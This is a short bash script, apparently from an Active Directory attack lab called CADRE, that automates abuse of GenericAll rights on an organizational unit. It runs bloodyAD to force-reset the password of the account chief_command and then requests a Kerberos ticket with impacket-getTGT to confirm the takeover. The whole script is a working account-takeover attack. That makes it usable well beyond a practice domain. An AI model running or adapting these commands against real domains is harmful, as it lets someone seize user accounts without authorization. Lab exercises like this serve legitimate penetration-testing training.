#!/bin/bash
# CADRE — WT#016 ACL GenericAll on OU
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#016 — ACL GenericAll on OU"
start_attack "016" "ACL GenericAll on OU"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"
require_env ATTACK_USER "ATTACK_USER"
require_env ATTACK_PASS "ATTACK_PASS"

step "Step 1: Abuse GenericAll on Command OU — force change chief_command password"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u $ATTACK_USER -p '$ATTACK_PASS' set password \"CN=chief_command,OU=Command,DC=cadre,DC=local\" 'NewP@ssw0rd!'"

step "Step 2: Validate by authenticating as chief_command"
run_cmd "impacket-getTGT \"$DOMAIN_ROOT/chief_command:NewP@ssw0rd!\" -dc-ip $DC01"

result $? "GenericAll-on-OU attack completed"
